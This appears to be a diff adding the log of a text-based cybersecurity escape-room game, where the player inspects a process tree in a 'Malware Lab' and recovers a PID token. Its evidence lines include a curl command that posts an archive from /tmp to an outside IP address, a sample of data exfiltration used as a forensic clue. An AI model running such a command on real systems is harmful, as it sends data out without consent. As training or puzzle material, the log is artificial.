@@ -1,0 +1,22 @@
+[Game] Cyber Escape Room started. Type 'help' for commands.
+You are in the Intro Lobby. Doors lead to: soc, dns, vault, malware, final.
+> move malware
+You enter the Malware Lab.
+A process tree contains parent-child relationships and decoy commands.
+Items here: proc_tree.jsonl
+> inspect proc_tree.json1
+That item is not available here. Items here: proc_tree.jsonl
+> inspect proc_tree.json
+That item is not available here. Items here: proc_tree.jsonl
+> inspect proc_tree.jsonl
+[Room Malware Lab] Analyzing proc_tree.jsonl...
+Token formed: 8914
+
+[Game] Input ended; closing the session.
+[Game] Session ended.
+
+TOKEN[PID]=8914
+EVIDENCE[PID].PATH=[5328->9488->3171->7905->8914]
+EVIDENCE[PID].CMD="curl -X POST http://198.51.100.33/upload -d @/tmp/x.tgz"
+EVIDENCE[PID].MALFORMED_SKIPPED=1
+FINAL_GATE=PENDING
